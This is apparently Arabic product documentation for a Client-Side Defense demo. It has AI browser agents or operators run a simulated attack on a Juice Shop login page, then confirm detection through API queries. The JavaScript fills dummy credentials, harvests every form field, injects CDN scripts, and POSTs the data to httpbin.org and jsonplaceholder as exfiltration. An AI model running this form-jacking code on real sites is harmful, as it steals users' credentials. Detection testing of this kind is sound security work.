تُولّد المرحلة 2 حركة مرور هجومية محاكاة ضد التطبيق المحمي وتؤكد أن CSD قام بكشفها. يجب إكمال المرحلة 1 — جميع فحوصات الخطوة 7 بحالة PASS — قبل المتابعة.

## الخطوة 8: محاكاة الهجوم

<Aside type="note">
تتطلب هذه الخطوة تنفيذ JavaScript من جانب المتصفح — لا يستطيع `curl` تفعيل كشف CSD. مساعدو الذكاء الاصطناعي المزودون بأدوات أتمتة المتصفح (MCP Chrome DevTools، Playwright، Puppeteer) ينفذون هذه الخطوات مباشرة باستخدام تسلسل **التنفيذ الآلي بالذكاء الاصطناعي** أدناه. المشغلون الذين لا يملكون أتمتة المتصفح ينفذون الخطوات اليدوية.
</Aside>

بعد التحقق من البنية التحتية (جميع فحوصات المرحلة 1 الخطوة 7 بحالة PASS)، شغّل نصوص محاكاة الهجوم لتوليد عمليات كشف CSD. النصوص البرمجية مُعرّفة في دليل [تفعيل الكشف](/csd/trigger-detection/) و[مكتبة نصوص الهجوم](/csd/attack-scripts/).

### التنفيذ الآلي بالذكاء الاصطناعي

مساعدو الذكاء الاصطناعي المزودون بأدوات أتمتة المتصفح يشغّلون محاكاة الهجوم برمجياً:

1. **التنقل مع initScript** — انتقل أولاً إلى `about:blank` لضمان سياق مستند نظيف (يتجنب initScripts القديمة من عمليات التنقل السابقة)، ثم `navigate_page` إلى `http://$F5XC_DOMAINNAME/#/login` مع `initScript` يحفظ `setInterval` و`clearInterval` و`fetch` و`console.log` الأصلية قبل أن يعدّلها zone.js، ويستطلع حقول نموذج تسجيل الدخول، ويملأ بيانات الاعتماد عبر setter الأصلي `HTMLInputElement.prototype.value`، وينفذ فوراً نص الكشف المجمّع بشكل مضمّن. استخدم initScript الحرفي أدناه.
2. **إغلاق شعار الترحيب** — `press_key` بمفتاح `Escape` لإغلاق شعار الترحيب. في الزيارات اللاحقة قد لا يظهر الشعار (ملفات تعريف الارتباط محفوظة). يتم إغلاق مربع حوار الموافقة على ملفات تعريف الارتباط تلقائياً بمفتاح Escape
3. **انتظار الاكتمال** — انتظر 10 ثوانٍ لاكتمال جميع استدعاءات تحميل/خطأ نصوص CDN وحلول وعود fetch
4. **التقاط الأدلة** — `list_console_messages` للتحقق من `[CSD Demo] Simulation complete` ونتائج تحميل CDN؛ `list_network_requests` مُفلترة بأنواع `script` و`fetch` للتحقق من أكواد حالة HTTP (`200`/`201` للنجاح، `pending` للطلبات المعلقة)

**initScript المرحلة 2 (حرفياً — استخدمه كما هو مكتوب تماماً):**

```javascript
// Save native references before zone.js patches them
var _si = window.setInterval.bind(window);
var _ci = window.clearInterval.bind(window);
var _fetch = window.fetch.bind(window);
var _log = window.console.log.bind(window.console);

// Poll for login form fields, fill credentials, run detection script
var _poll = _si(function() {
  var emailEl = document.querySelector('#email');
  var passEl  = document.querySelector('#password');
  if (emailEl && passEl) {
    _ci(_poll);
    // Fill credentials via native setter (bypasses zone.js)
    var nativeSet = Object.getOwnPropertyDescriptor(
      window.HTMLInputElement.prototype, 'value').set;
    nativeSet.call(emailEl, 'test@example.com');
    emailEl.dispatchEvent(new Event('input', { bubbles: true }));
    nativeSet.call(passEl, 'P@ssword123');
    passEl.dispatchEvent(new Event('input', { bubbles: true }));

    // Run Combined Detection Script inline using native fetch for exfil
    (function() {
      _log('==================================================');
      _log('[CSD Demo] Combined Detection Script — Starting');
      _log('==================================================');

      _log('\n[Formjack] Phase 1: Form field harvesting');
      var inputs = document.querySelectorAll('input');
      var harvested = {};
      inputs.forEach(function(input) {
        var name = input.name || input.id || input.type;
        harvested[name] = input.value || '(empty)';
      });
      _log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);

      _log('\n[Supply Chain] Phase 2: Multi-CDN script injection');
      var cdns = [
        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' }
      ];
      cdns.forEach(function(cdn) {
        var script = document.createElement('script');
        script.src = cdn.url;
        script.onload = function() { _log('[Supply Chain] Loaded from ' + cdn.name + ': ' + cdn.url); };
        script.onerror = function() { _log('[Supply Chain] Blocked/failed from ' + cdn.name + ': ' + cdn.url); };
        document.head.appendChild(script);
        _log('[Supply Chain] Injected script tag: ' + cdn.name);
      });

      _log('\n[Exfil] Phase 3: Data exfiltration');
      var payload = JSON.stringify({
        type: 'combined_demo', credentials: harvested,
        page: window.location.href, timestamp: Date.now()
      });
      _fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload })
        .then(function() { _log('[Exfil] Data sent to www.httpbin.org'); });
      _fetch('https://jsonplaceholder.typicode.com/posts', {
        method: 'POST', mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' }, body: payload
      }).then(function() { _log('[Exfil] Data sent to jsonplaceholder.typicode.com'); });

      _log('\n==================================================');
      _log('[CSD Demo] Simulation complete');
      _log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
      _log('[CSD Demo] Scripts injected: 4 (4 CDN domains)');
      _log('[CSD Demo] Exfil channels: 2 (fetch POST)');
      _log('==================================================');
    })();
  }
}, 300);
```

<Aside type="caution">
**عدم توافق zone.js** — يستخدم Juice Shop مكتبة zone.js الخاصة بـ Angular، التي تعدّل `setTimeout` و`setInterval` و`fetch` و`XMLHttpRequest` وواجهات برمجة المتصفح الأخرى. هذا يُعطّل أدوات MCP مثل `evaluate_script` و`fill` و`click` مع خطأ `Cannot read properties of undefined (reading 'call')`. استخدم `navigate_page` مع `initScript` بدلاً من ذلك — يعمل `initScript` قبل تحميل zone.js، لذا يمكنك حفظ مراجع API الأصلية واستخدامها في استدعاءات الاستطلاع. يجب أن يملأ initScript حقول النموذج باستخدام setter الأصلي `HTMLInputElement.prototype.value` (وليس `fill`) وتشغيل نص الكشف بشكل مضمّن (وليس عبر `setTimeout` الذي قد يعترضه zone.js بعد تحميل الصفحة). راجع [تفعيل الكشف — التنفيذ الآلي بالذكاء الاصطناعي](/csd/trigger-detection/#ai-automated-execution) للتفاصيل.
</Aside>

<Aside type="note">
**تراكم initScript** — كل استدعاء `navigate_page` مع معامل `initScript` يضيف النص البرمجي إلى قائمة دائمة تعمل على كل تحميل مستند لاحق. لتجنب تداخل النصوص القديمة، إما انتقل إلى `about:blank` بين عمليات التشغيل أو استخدم `new_page` مع `isolatedContext` لسياق متصفح نظيف.
</Aside>

<Aside type="note">
**حفظ `fetch` الأصلي في initScript** — يحفظ initScript `window.fetch.bind(window)` قبل أن يعدّله zone.js. هذا يضمن عمل استدعاءات fetch بشكل صحيح دون أخطاء zone.js `Cannot read properties of undefined`. يُستخدم نفس initScript (مع حفظ `fetch` الأصلي) لكل من عمليات هجوم المرحلة 2 والمرحلة 3 — لا يعترض تخفيف CSD استدعاءات `fetch()`، لذا حفظ المرجع الأصلي لا يؤثر على سلوك التخفيف.
</Aside>

<Aside type="caution">
**خطأ 404 عابر من المصدر** — عند التنقل الأول إلى تطبيق Angular، قد يُرجع `polyfills.js` أو نصوص التطبيق الأخرى خطأ HTTP 404 عابراً من خادم المصدر. هذا يتسبب في فشل تمهيد Angular، مما ينتج عنه صفحة فارغة بدون نموذج تسجيل دخول. خطأ 404 مؤقت — الطلبات اللاحقة تُرجع 200 أو 304. **الاسترداد:** انتقل إلى `about:blank`، انتظر ثانيتين، ثم أعد محاولة التنقل. إذا استمرت المشكلة عبر عدة محاولات، تحقق من صحة المصدر عبر مسار موازن الحمل (`curl -s -o /dev/null -w '%{http_code}' http://$F5XC_DOMAINNAME/polyfills.js`).
</Aside>

### التنفيذ اليدوي

المشغلون الذين لا يملكون أدوات أتمتة المتصفح ينفذون الخطوات يدوياً:

1. **انتقل** إلى صفحة تسجيل الدخول للتطبيق المحمي: `http://xF5XC_DOMAINNAMEx/#/login`
2. **أدخل بيانات اعتماد وهمية** — اكتب `test@example.com` في حقل البريد الإلكتروني و`P@ssword123` في حقل كلمة المرور (لا تُرسل النموذج)
3. **افتح أدوات المطور** — اضغط **F12** وانتقل إلى علامة تبويب **Console**
4. **شغّل نص الكشف المجمّع** — الصق النص البرمجي من [تفعيل الكشف &mdash; تشغيل نص المحاكاة المجمّع](/csd/trigger-detection/#run-the-combined-simulation-script) في وحدة التحكم واضغط Enter
5. **تحقق من مخرجات وحدة التحكم** — تأكد أن مخرجات `[CSD Demo]` المرحلية تُظهر: حصاد الحقول، وحقن النصوص من 4 نطاقات CDN، وتسريب البيانات إلى نقطتي نهاية

### ما يتم تفعيله

| الإشارة | السلوك | الكشف |
| --- | --- | --- |
| حصاد حقول النموذج | يقرأ قيم حقول إدخال البريد الإلكتروني وكلمة المرور | نصوص تقرأ حقول النموذج الحساسة — مُصنّفة عالية الخطورة |
| حقن النصوص | يحقن 4 وسوم `&lt;script&gt;` من `cdn.jsdelivr.net`، `esm.sh`، `unpkg.com`، `ga.jspm.io` | يتم كشف حتى 4 نطاقات نصوص جهات خارجية جديدة (يختلف توفر CDN) |
| تسريب البيانات | يرسل البيانات المحصودة عبر `fetch` إلى `www.httpbin.org` و`jsonplaceholder.typicode.com` | استدعاءات شبكية إلى نطاقات خارجية |

<Aside type="note">
**يختلف توفر CDN.** لن تُحمّل جميع نصوص CDN الأربعة في كل
عملية تشغيل — قد تتسبب قيود موارد المتصفح أو ظروف الشبكة أو تقييد CDN
في فشل بعضها مع `ERR_INSUFFICIENT_RESOURCES` أو انتهاء المهلة.
تنجح المحاكاة إذا تم تحميل **أي** نص CDN. يكشف CSD
محاولة الحقن بغض النظر عما إذا تم تحميل النص بنجاح —
إنشاء وسم `&lt;script&gt;` نفسه هو إشارة الكشف.

في الحالات الشديدة، يمكن أن يتصاعد `ERR_INSUFFICIENT_RESOURCES` إلى فشل على مستوى الصفحة — تصبح الصفحة بأكملها فارغة، وتنتهي مهلة لقطات الشاشة، ويفشل `take_snapshot`. يحدث هذا عادةً بعد تراكم عدة عمليات تنقل مع initScripts ثقيلة في نفس سياق المتصفح. **الاسترداد:** استخدم `new_page` مع `isolatedContext` لإنشاء سياق متصفح جديد، ثم أعد المحاولة من تسلسل `about:blank` → `navigate_page` مع initScript. هذا مختلف عن فشل نصوص CDN الفردية، التي لا تؤثر على نجاح المحاكاة.
</Aside>

<Aside type="tip">
بعد تشغيل محاكاة الهجوم، استخدم حلقة الاستطلاع الحتمية هذه لانتظار عمليات الكشف:

1. استعلم عن `/detected_domains` كل 60 ثانية
2. إذا نجح DET-3 (ظهرت نطاقات التسريب في `/detected_domains`)، انتقل إلى الخطوة 9 فوراً
3. إذا ظل فارغاً بعد 10 استعلامات (10 دقائق)، تحقق من حالة CSD (المرحلة 1 الخطوة 5) وتسجيل النطاق المحمي (المرحلة 1 الخطوة 6) — من المرجح أن أحدهما مُهيّأ بشكل خاطئ
4. إذا ظل فارغاً بعد 30 استعلاماً (30 دقيقة)، توقف وأبلغ المشغل — لا تتابع إلى المرحلة 3

لمحاكاة إضافية مستهدفة (فئات هجوم فردية، اختبار إجهاد أقصى للكشف)، راجع [مكتبة نصوص الهجوم](/csd/attack-scripts/).
</Aside>

### الأدلة

يجب أن يُبلغ مساعد الذكاء الاصطناعي عما يلي. للتنفيذ الآلي بالذكاء الاصطناعي، يتم التقاط الأدلة برمجياً عبر `list_console_messages` (تسجّل دالة الاستطلاع في initScript النتائج في وحدة التحكم). للتنفيذ اليدوي، يقرأ المشغل مخرجات وحدة تحكم المتصفح.

| الفحص | المتوقع | الحالة |
| --- | --- | --- |
| تم تحميل صفحة تسجيل الدخول | `200 OK` في `http://$F5XC_DOMAINNAME/#/login` | PASS / FAIL |
| تم تنفيذ نص وحدة التحكم | `[CSD Demo] Simulation complete` في مخرجات وحدة التحكم | PASS / FAIL |
| حصاد الحقول | العدد &gt; 0 في مخرجات وحدة التحكم | PASS |
| حقن النصوص | 1–4 نطاقات CDN في مخرجات وحدة التحكم (قد يفشل بعضها بأخطاء موارد) | PASS إذا ظهر أي نطاق CDN |
| قنوات التسريب | محاولتا fetch POST في مخرجات وحدة التحكم | PASS |

<Aside type="tip">
إذا كانت شهادة HTTPS LB صالحة (`CertificateValid`)، يمكنك اختيارياً تشغيل المحاكاة ضد `https://$F5XC_DOMAINNAME/#/login` أيضاً. هذا ليس مطلوباً لتقدم العرض التوضيحي.
</Aside>

## الخطوة 9: التحقق من الكشف عبر API

استعلم عن نقاط نهاية CSD API لتأكيد ظهور عمليات الكشف. استخدم حلقة الاستطلاع: استعلم عن `/detected_domains` كل 60 ثانية؛ تابع بمجرد نجاح DET-3. إذا لم ينجح DET-3 بعد 10 دقائق، تحقق من تهيئة CSD. إذا لم ينجح DET-3 بعد 30 دقيقة، توقف وأبلغ المشغل. هذه النقاط النهائية موثقة في [مرجع API](/csd/api-reference/) وتستخدم نفس المصادقة وفضاء الأسماء كالخطوات السابقة.

<Aside type="note">
**ترتيب معالجة نقاط النهاية:** يتم ملء `/detected_domains` أولاً وهو المؤشر الأساسي على عمل خط أنابيب CSD. يتم ملء `/scripts` و`/formFields` وفق جدول معالجة خلفي أبطأ وقد يظلان فارغين لمدة 20–30 دقيقة حتى بعد عمليات محاكاة متعددة. إذا أظهر `/detected_domains` نطاقات التسريب (`www.httpbin.org`، `jsonplaceholder.typicode.com`)، اعتبر المحاكاة مكشوفة بنجاح وتابع — يعكس فحص DET-1 أدناه هذا الأمر.
</Aside>

### النصوص المكشوفة

استعلم عن النصوص المكشوفة في آخر 24 ساعة:

```bash
NOW=$(date +%s)
START=$(( NOW - 86400 ))
curl -s -X POST \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  -H "Content-Type: application/json" \
  -d "{\"startTime\": \"$START\", \"endTime\": \"$NOW\"}" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/scripts" \
  | jq '{total: (.scripts | length), scripts: [.scripts[]? | {script_name: .script_name, risk_level: .risk_level}]}'
```

| الحقل | المتوقع | الحالة |
| --- | --- | --- |
| `total` | &gt; 0 (تم كشف نصوص) | PASS إذا &gt; 0؛ PENDING إذا كان 0 لكن `/detected_domains` يُظهر نطاقات التسريب |
| أسماء النصوص | تتضمن نطاقات CDN (`cdn.jsdelivr.net`، `esm.sh`، `unpkg.com`، `ga.jspm.io`) في `script_name` | PASS إذا ظهرت نطاقات CDN المحقونة |

### النطاقات المكشوفة

```bash
curl -s \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/detected_domains" \
  | jq '{total_domains: .domain_summary.totalDomains, domains: [.domains_list[]? | {domain: .domain, category: .category}]}'
```

| الحقل | المتوقع | الحالة |
| --- | --- | --- |
| `total_domains` | &gt; 0 | PASS إذا &gt; 0 |
| قائمة النطاقات | تتضمن نطاقات CDN والتسريب | PASS إذا ظهرت النطاقات المتوقعة |

### حقول النموذج

```bash
NOW=$(date +%s)
START=$(( NOW - 86400 ))
curl -s \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/formFields?startTime=$START&endTime=$NOW" \
  | jq '{total: .total_size, fields: [.form_fields[]? | {name: .name, sensitivity: .analysis.value, scripts: (.associated_scripts | length), locations: .locations}]}'
```

| الحقل | المتوقع | الحالة |
| --- | --- | --- |
| `total` | &gt; 0 | PASS إذا &gt; 0؛ PENDING إذا كان 0 لكن DET-3 نجح |
| `name` | يتضمن `email`، `password` | PASS إذا ظهرت الحقول الحساسة |
| `sensitivity` | `Sensitive` لحقول البريد الإلكتروني/كلمة المرور | PASS إذا صنّف التعلم الآلي بشكل صحيح |

<Aside type="note">
**معالجة حقول النموذج أبطأ من كشف النطاقات.** قد تُرجع
نقطة نهاية `/formFields` حقولاً ببيانات وصفية جزئية
عند الاستعلام الأول. يتم ملء تصنيف حساسية التعلم الآلي (`Sensitive` مقابل
`Not Sensitive`) بعد اكتمال المعالجة الخلفية —
قد يستغرق ذلك 20–30 دقيقة بعد أول عملية محاكاة. إذا
ظهرت الحقول لكن بدون تصنيف، أعد الاستعلام لاحقاً. DET-3
(`/detected_domains`) هو معيار النجاح الأساسي.
</Aside>

### ملخص أدلة المرحلة 2

بعد جميع استعلامات الكشف، قدّم حالة الكشف النهائية:

| معرّف الاختبار | الفحص | الحالة |
| --- | --- | --- |
| DET-1 | كشف النصوص (نقطة نهاية `/scripts`) | PASS إذا &gt; 0؛ PENDING إذا كان فارغاً لكن DET-3 نجح |
| DET-2 | كشف نطاقات CDN | PASS / FAIL |
| DET-3 | كشف نطاقات التسريب (`/detected_domains`) | **المؤشر الأساسي** — PASS إذا ظهر `www.httpbin.org` أو `jsonplaceholder.typicode.com` |
| DET-4 | كشف حقول النموذج (نقطة نهاية `/formFields`) | PASS إذا &gt; 0؛ PENDING إذا كان فارغاً لكن DET-3 نجح |

<Aside type="note">
**الحد الأدنى لمعايير النجاح للانتقال إلى المرحلة 3:** يجب أن ينجح DET-3 (نطاقات التسريب مرئية في `/detected_domains`). قد يُظهر DET-1 وDET-4 حالة PENDING عند الاستخدام الأول أو بعد إعادة بناء جديدة — هذا طبيعي. إذا أظهر DET-3 أيضاً FAIL بعد 30 دقيقة، تحقق من تفعيل CSD (المرحلة 1 الخطوة 5)، وتسجيل النطاق المحمي (المرحلة 1 الخطوة 6)، وحقن وسم CSD JS (فحص تهيئة JS في المرحلة 1 الخطوة 7).
</Aside>
